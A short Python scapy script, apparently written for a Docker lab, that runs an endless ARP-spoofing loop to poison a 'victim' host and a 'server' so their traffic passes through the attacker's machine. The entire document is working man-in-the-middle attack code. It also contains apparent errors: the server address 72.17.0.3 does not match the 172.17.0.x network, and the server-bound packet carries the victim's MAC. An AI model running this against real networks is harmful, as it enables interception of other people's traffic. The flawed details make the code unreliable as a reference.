from scapy.all import *
import time

victima_ip = "172.17.0.2"
servidor_ip = "72.17.0.3"
interfaz = "docker0"

mi_mac = get_if_hwaddr(interfaz)
victima_mac = getmacbyip(victima_ip)
servidor_mac = getmacbyip(servidor_ip)

def spoof():
    print("[*] Iniciando ARP Spoofing...")
    while True:
        send(ARP(op=2, pdst=victima_ip, psrc=servidor_ip, hwdst=victima_mac), verbose=0)
        send(ARP(op=2, pdst=servidor_ip, psrc=victima_ip, hwdst=victima_mac), verbose=0)
        time.sleep(2)

spoof()
